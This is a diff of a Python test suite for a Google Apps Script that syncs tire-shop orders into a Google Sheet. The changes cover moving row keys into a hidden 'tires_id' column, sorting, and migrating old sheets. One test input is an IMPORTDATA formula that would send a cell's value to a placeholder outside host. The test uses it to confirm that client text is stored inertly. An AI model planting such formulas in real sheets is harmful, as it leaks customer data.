@@ -501,7 +501,7 @@ def test_the_script_knows_the_columns_of_the_panel():
     code = script_text()
     for name in re.findall(r"'([^']+)'", re.search(r"var DAYS = \[(.*?)\];", code).group(1)) + ["Списание", "Дата счета"]:
         assert name in sheet.COLUMNS, name
-    assert "var KEY_COLUMN = 'Дата счета';" in code and "function removeApostrophes()" in code                # the owner 2026-11-01
+    assert "var KEY_COLUMN = 'tires_id';" in code and "function removeApostrophes()" in code and "hideColumns" in code   # 2026-11-01
     assert "function selfTest()" in code and "function marksBackForRollback()" in code and "/^=/.test(value)" in code
     for name in re.findall(r"'([^']+)'", re.search(r"var PANEL_COLUMNS = \[(.*?)\];", code, re.S).group(1)):
         assert name in sheet.COLUMNS, name
@@ -656,6 +656,14 @@ Sheet.prototype.getLastRow = function () {                          // as Google
 };
 Sheet.prototype.getMaxRows = function () { return this.maxRows; };
 Sheet.prototype.insertRowsAfter = function (after, n) { this.maxRows += n; };
+Sheet.prototype.getMaxColumns = function () { return this.maxCols || this.width(); };
+Sheet.prototype.insertColumnsAfter = function (after, n) { this.maxCols = this.getMaxColumns() + n; };
+Sheet.prototype.hideColumns = function (c) { (this.hidden = this.hidden || []).push(c); };
+Sheet.prototype.keyAt = function (key) {                              // the row whose hidden «tires_id» holds `key`
+  var c = this.cells[0].indexOf('tires_id') + 1;
+  for (var r = 2; r <= this.cells.length; r++) if (c && this.get(r, c) === key) return r;
+  return 0;
+};
 Sheet.prototype.sortBy = function (c, desc) {                        // what the owner's sort does: the cells and their notes move together
   var self = this, body = [];
   var w = this.width();
@@ -726,7 +734,9 @@ out.create = post({secret: SECRET, sheet: 'Заказы', rows: [
   {key: 'tires:1:2', create: true, fields: fields('222', 'Шина 222', 'Алла')}]});
 out.again = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1:1', create: true, fields: fields('111', 'Шина 111', 'Яна')}]});
 out.rowsAfterCreate = sheet.cells.length;
-out.at = {one: sheet.notes['6,' + col['Дата счета']], two: sheet.notes['7,' + col['Дата счета']]};
+var kc = sheet.cells[0].indexOf('tires_id') + 1;                       // added by the script at the end, hidden (the owner 2026-11-01)
+out.at = {one: sheet.get(6, kc), two: sheet.get(7, kc), keyAt: kc, last: kc === sheet.cells[0].length, hidden: sheet.hidden || [],
+          notes: Object.keys(sheet.notes).filter(function (k) { return String(sheet.notes[k]).indexOf('tires:') === 0; }).length};
 out.text = {phone: sheet.raw['6,' + col['Телефон']], note: sheet.get(6, col['Примечание']), qty: sheet.raw['6,' + col['Кол-во']],
             day: sheet.get(6, col['Дата счета']) instanceof Date ? sheet.get(6, col['Дата счета']).getHours() : null, fmt: sheet.formats['6,' + col['Дата счета']],
             box: sheet.valid['6,' + col['Списание']] || null, manual: sheet.get(2, col['Имя'])};
@@ -736,7 +746,8 @@ sheet.sortBy(col['Имя'], false);                                          // 
 out.update = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1:1', create: false, fields: {'Этап': 'Товар на точке'}, check: {'Артикул': '111'}}]});
 out.afterSort = {};
 for (var r = 2; r <= sheet.cells.length; r++) if (sheet.get(r, col['Имя'])) out.afterSort[sheet.get(r, col['Имя'])] = sheet.get(r, col['Этап']);
-var alla = Object.keys(sheet.notes).filter(function (k) { return sheet.notes[k] === 'tires:1:2'; })[0].split(',')[0];
+var alla = sheet.keyAt('tires:1:2');                                      // the mark moved with its row (the sort above)
+out.allaName = sheet.get(Number(alla), col['Имя']);
 sheet.set(Number(alla), col['Артикул'], "'333");                         // the owner rewrote the row
 out.rewritten = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1:2', create: false, fields: {'Этап': 'Выполнено'}, check: {'Артикул': '222'}}]});
 out.allaStage = sheet.get(Number(alla), col['Этап']);
@@ -745,20 +756,26 @@ out.lacking = post({secret: SECRET, sheet: 'Заказы', rows: [{key: 'tires:1
 out.manualAfter = [];                                                     // the owner's column after everything: only his «Итого»
 for (var r2 = 2; r2 <= sheet.cells.length; r2++) if (sheet.get(r2, col['Комментарий владельца']) !== '') out.manualAfter.push(sheet.get(r2, col['Комментарий владельца']));
 out.second = post({secret: SECRET, sheet: 'Второй', rows: [{key: 'tires:2:1', create: true, fields: fields('111', 'Шина 111', 'Ян')}]});
-out.secondAt = {formula: second.formulas['2,' + col['Прибыль ₽']], note2: second.notes['2,' + col['Дата счета']] || '', note3: second.notes['3,' + col['Дата счета']]};
-var old = new Sheet(['Дата'].concat(COLS), 6);                             // a sheet of before 2026-11-01: the marks in «Дата»
-var oc = {}; old.cells[0].forEach(function (n, i) { oc[n] = i + 1; });
+out.secondAt = {formula: second.formulas['2,' + col['Прибыль ₽']], at: second.keyAt('tires:2:1')};
+var old = new Sheet(['Дата'].concat(COLS), 6);                             // a sheet of before: the marks in the notes of «Дата»
+var oc = {}; old.cells[0].forEach(function (n, i) { oc[n] = i + 1; });      // and of «Дата счета», a note of the owner beside them
 old.set(2, oc['Артикул'], "'777"); old.notes['2,' + oc['Дата']] = 'tires:5:1';
-old.set(3, oc['Артикул'], "'888"); old.notes['3,' + oc['Дата']] = 'tires:5:2'; old.notes['3,' + oc['Дата счета']] = 'своё примечание';
+old.set(3, oc['Артикул'], "'888"); old.notes['3,' + oc['Дата счета']] = 'tires:5:2'; old.notes['3,' + oc['Дата']] = 'своё примечание';
 Book.getSheetByName = function (n) { return n === 'Заказы' ? sheet : n === 'Второй' ? second : n === 'Старый' ? old : null; };
 out.oldPing = post({secret: SECRET, sheet: 'Старый', ping: true, columns: COLS});
+var okc = old.cells[0].indexOf('tires_id') + 1;
+out.oldMarks = {two: old.get(2, okc), three: old.get(3, okc), hidden: old.hidden || [], last: okc === old.cells[0].length,
+                note2: old.notes['2,' + oc['Дата']] || '', note3: old.notes['3,' + oc['Дата счета']] || '', own: old.notes['3,' + oc['Дата']]};
 out.oldPingAgain = post({secret: SECRET, sheet: 'Старый', ping: true, columns: COLS});
+old.notes['2,' + oc['Дата счета']] = 'tires:9:9';                            // a mark that is not this row's: left alone, said
+old.notes['2,' + oc['Дата']] = 'tires:5:1';                                 // the same mark again: only the note goes
+out.oldPingOdd = post({secret: SECRET, sheet: 'Старый', ping: true, columns: COLS});
+out.oddNotes = {other: old.notes['2,' + oc['Дата счета']], same: old.notes['2,' + oc['Дата']] || '', key: old.get(2, okc)};
 out.oldUpdate = post({secret: SECRET, sheet: 'Старый', rows: [{key: 'tires:5:1', create: false, fields: {'Телефон': '89811724133', '№ заказа MIM': '05300825'},
                                                               check: {'Артикул': '777'}}]});
-out.oldAfter = {mark: old.notes['2,' + oc['Дата счета']], own: old.notes['3,' + oc['Дата счета']], oldMark: old.notes['2,' + oc['Дата']],
-                phone: old.raw['2,' + oc['Телефон']], phoneType: typeof old.get(2, oc['Телефон']), phoneFmt: old.formats['2,' + oc['Телефон']],
+out.oldAfter = {phone: old.raw['2,' + oc['Телефон']], phoneType: typeof old.get(2, oc['Телефон']), phoneFmt: old.formats['2,' + oc['Телефон']],
                 number: old.get(2, oc['№ заказа MIM'])};
-var ours = Object.keys(sheet.notes).filter(function (k) { return sheet.notes[k] === 'tires:1:1'; })[0].split(',')[0];
+var ours = String(sheet.keyAt('tires:1:1'));
 sheet.formats[ours + ',' + col['№ заказа MIM']] = '';
 sheet.set(Number(ours), col['№ заказа MIM'], "'5300825");                    // written by the old script: «'5300825»
 sheet.set(Number(ours), col['Кол-во'], 4);
@@ -767,6 +784,7 @@ out.removed = removeApostrophes();
 out.cleaned = {number: sheet.raw[ours + ',' + col['№ заказа MIM']], fmt: sheet.formats[ours + ',' + col['№ заказа MIM']],
                qty: sheet.raw[ours + ',' + col['Кол-во']], qtyFmt: sheet.formats[ours + ',' + col['Кол-во']] || '',
                manual: sheet.raw['2,' + col['Имя']], box: sheet.get(Number(ours), col['Списание'])};
+out.keyUntouched = sheet.get(Number(ours), kc) === 'tires:1:1';
 out.selfTest = selfTest();
 out.probes = probes.length === 2 && probes[1] === 'deleted';
 console.log(JSON.stringify(out));
@@ -783,25 +801,32 @@ def test_the_script_on_a_fake_of_google_sheets(tmp_path):
     assert out["ping"] == {"ok": True, "missing": ["Нет такой"], "moved": 0, "marked": 0, "blocked": 0} and out["wrong"] == {"ok": False, "error": "неверный секрет"}
     assert out["create"]["results"] == [{"key": "tires:1:1", "status": "created"}, {"key": "tires:1:2", "status": "created"}]
     assert out["again"]["results"] == [{"key": "tires:1:1", "status": "updated"}] and out["rowsAfterCreate"] == 7    # no double row
-    assert out["at"] == {"one": "tires:1:1", "two": "tires:1:2"}           # under the owner's rows «Итого» and the formula, over the checkbox; rows added
+    at = out["at"]                                                          # under the owner's rows «Итого» and the formula, over the checkbox
+    assert (at["one"], at["two"], at["last"], at["notes"]) == ("tires:1:1", "tires:1:2", True, 0) and at["hidden"] == [at["keyAt"]]
     assert out["kept"] == {"total": "Итого", "sum": "=SUM(K2:K2)", "empty": '=IF(K4="";"";K4)', "name3": "", "name4": "", "note5": "Заберут 02/08", "name5": ""}
     assert out["text"] == {"phone": "+7 911 111-22-33", "note": '=IMPORTDATA("https://x/?"&B2)', "qty": 4, "day": 12, "fmt": "dd.mm.yyyy",
                            "box": "checkbox", "manual": "Ручная строка"}             # text as text: a formula of a client never runs (only
                                                                                  # «=+-@» keep the apostrophe, 2026-11-01)
     assert out["update"]["results"] == [{"key": "tires:1:1", "status": "updated"}]
     assert out["afterSort"] == {"Алла": "Заказ оформлен", "Ручная строка": "", "Яна": "Товар на точке"}     # sorted: still the right row
+    assert out["allaName"] == "Алла"                                          # the hidden mark went with its row in the sort
     assert out["rewritten"]["results"] == [{"key": "tires:1:2", "status": "missing"}] and out["allaStage"] == "Заказ оформлен"
     assert out["gone"]["results"] == [{"key": "tires:9:9", "status": "missing"}]
     assert out["second"]["results"] == [{"key": "tires:2:1", "status": "created"}]
-    assert out["secondAt"] == {"formula": '=IF(K2="";"";K2)', "note2": "", "note3": "tires:2:1"}                     # under the formula, not on it
+    assert out["secondAt"] == {"formula": '=IF(K2="";"";K2)', "at": 3}                                             # under the formula, not on it
     assert out["lacking"]["results"][0]["status"] == "error" and out["manualAfter"] == ["Итого"]
-    # the owner 2026-11-01: the marks move from «Дата» to «Дата счета» (never over a note there), once; text without the apostrophe
-    assert out["oldPing"] == {"ok": True, "missing": [], "moved": 1, "marked": 1, "blocked": 1}               # «своё примечание»: blocked
-    assert out["oldPingAgain"] == {"ok": True, "missing": [], "moved": 0, "marked": 1, "blocked": 1}
+    # the owner 2026-11-01: the marks go from the notes into the hidden «tires_id» and the notes with a mark go; a note of the owner stays
+    assert out["oldPing"] == {"ok": True, "missing": [], "moved": 2, "marked": 2, "blocked": 0}
+    assert out["oldMarks"] == {"two": "tires:5:1", "three": "tires:5:2", "hidden": [len(sheet.COLUMNS) + 2], "last": True,
+                               "note2": "", "note3": "", "own": "своё примечание"}
+    assert out["oldPingAgain"] == {"ok": True, "missing": [], "moved": 0, "marked": 2, "blocked": 0}         # again: nothing more
+    assert out["oldPingOdd"] == {"ok": True, "missing": [], "moved": 0, "marked": 2, "blocked": 1}
+    assert out["oddNotes"] == {"other": "tires:9:9", "same": "", "key": "tires:5:1"}                     # another mark: left; the same: gone
     assert out["oldUpdate"]["results"] == [{"key": "tires:5:1", "status": "updated"}]                     # an old row is still found
-    assert out["oldAfter"] == {"mark": "tires:5:1", "own": "своё примечание", "oldMark": "tires:5:1", "phone": "89811724133",
+    assert out["oldAfter"] == {"phone": "89811724133",
                                "phoneType": "string", "phoneFmt": "@", "number": "05300825"}            # text stays text, the zero stays
     assert out["selfTest"] == "OK: текст пишется как текст, без апострофа." and out["probes"]                # the temporary sheet is gone
+    assert out["keyUntouched"]                                                                              # removeApostrophes skips «tires_id»
     assert out["removed"] >= 1 and out["cleaned"]["number"] == "5300825" and out["cleaned"]["fmt"] == "@"
     assert out["cleaned"]["qty"] == 4 and out["cleaned"]["qtyFmt"] == "" and out["cleaned"]["manual"] == "'Ручная строка"   # a number and
 
@@ -809,8 +834,9 @@ def test_the_script_on_a_fake_of_google_sheets(tmp_path):
 # ---- the owner's answers of 2026-10-30 (evening) ------------------------------------------------------------------------------------
 
 def test_a_sheet_without_the_note_column_still_takes_the_rows_and_the_invoice_day_stays_asked(table):
-    """«Примечание» is never filled (the owner 2026-10-30) and may go; «Дата счета» holds the hidden mark of each row (the script's
-    KEY_COLUMN, the owner 2026-11-01): «Проверить» still asks for it."""
+    """«Примечание» is never filled (the owner 2026-10-30) and may go; «Дата счета» is one of the panel's columns: «Проверить» asks for
+    it. The hidden «tires_id» (the script's KEY_COLUMN) is never asked: the script adds it by itself (the owner 2026-11-01)."""
+    assert "tires_id" not in sheet.ASKED and "tires_id" not in sheet.COLUMNS
     conn, box, fake = table
     fake.columns = [c for c in sheet.COLUMNS if c != "Дата счета"]
     with pytest.raises(sheet.SheetError, match="нет колонок: Дата счета"):
@@ -818,9 +844,10 @@ def test_a_sheet_without_the_note_column_still_takes_the_rows_and_the_invoice_da
     fake.columns = [c for c in sheet.COLUMNS if c != "Примечание"]
     fake.marks = {"moved": 12, "marked": 40, "blocked": 0}                # «Проверить» moved the marks of «Дата» (the owner 2026-11-01)
     said = sheet.check(conn, box, fake)
-    assert said.endswith("Строк с меткой в «Дата счета»: 40, перенесено сейчас из «Дата»: 12, не перенесено: 0.") and "пока не удаляйте" not in said
-    fake.marks = {"moved": 0, "marked": 38, "blocked": 2}                 # two rows had a note of the owner in «Дата счета»
-    assert "не перенесено: 2. Колонку «Дата» пока не удаляйте: у 2 строк в «Дата счета» уже есть своё примечание" in sheet.check(conn, box, fake)
+    assert said.endswith("Строк с меткой (скрытая колонка «tires_id»): 40, перенесено сейчас из примечаний: 12, не перенесено: 0.")
+    assert "пока не удаляйте" not in said
+    fake.marks = {"moved": 0, "marked": 38, "blocked": 2}                 # two notes with a mark of another row
+    assert "не перенесено: 2. У 2 строк метка в примечании расходится с колонкой «tires_id»" in sheet.check(conn, box, fake)
     fake.marks = {}
     mine = placed(conn, comment="Позвонить вечером")
     assert sheet.check(conn, box, fake) == "Таблица отвечает: лист «Заказы», все колонки на месте."
